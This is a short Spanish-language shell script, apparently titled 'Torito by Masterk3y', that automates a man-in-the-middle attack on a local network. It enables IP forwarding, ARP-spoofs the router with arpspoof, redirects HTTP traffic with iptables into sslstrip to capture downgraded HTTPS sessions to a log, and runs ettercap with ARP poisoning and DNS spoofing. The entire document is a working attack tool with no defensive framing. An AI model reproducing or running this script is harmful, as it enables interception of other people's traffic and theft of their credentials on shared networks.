#!/bin/sh
echo "Corriendo Torito by Masterk3y 0.1"
echo 1 > /proc/sys/net/ipv4/ip_forward
echo -n "IP Del Router: "
read iprouter
echo -n "Interface a usar: "
read interface
xterm -geometry 75x15+1+300 -T "Inicia ataque ARP Spoof" -e arpspoof -i $interface $iprouter &
sleep 2
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080 &
echo "Enrutando con Tables"
xterm -geometry 75x15+500+300 -T "No cerrar esta ventana" -e sslstrip -a -k -f &
echo "SSL Strip corriendo"
sleep 2
xterm -geometry 75x15+500+300 -T "Logs" -e tail -f capturas.log &
xterm -geometry 75x15+1000+300 -T Ettercap -e ettercap -Tqi $interface -M arp:remote -P dns_spoof // //
killall sslstrip
killall arpspoof
